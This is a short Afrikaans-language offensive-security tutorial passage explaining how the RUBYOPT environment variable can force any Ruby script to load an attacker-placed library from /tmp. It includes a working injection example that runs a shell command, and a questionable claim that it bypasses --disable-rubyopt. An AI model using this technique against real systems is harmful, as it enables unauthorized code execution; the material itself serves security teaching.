## RUBYOPT

Deur hierdie omgewing veranderlike is dit moontlik om **nuwe params** by **ruby** te voeg wanneer dit uitgevoer word. Alhoewel die param **`-e`** nie gebruik kan word om ruby kode aan te dui om uit te voer nie, is dit moontlik om die params **`-I`** en **`-r`** te gebruik om 'n nuwe gids by die biblioteke laai pad te voeg en dan **'n biblioteek aan te dui om te laai**.

Skep die biblioteek **`inject.rb`** in **`/tmp`**:

{% code title="inject.rb" %}
```ruby
puts `whoami`
```
{% endcode %}

Skep enige plek 'n ruby-skrip soos:

{% code title="hello.rb" %}
```ruby
puts 'Hello, World!'
```
{% endcode %}

Laastens maak 'n arbitr√™re ruby-skrip dit laai met:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Fun feit, dit werk selfs met param **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
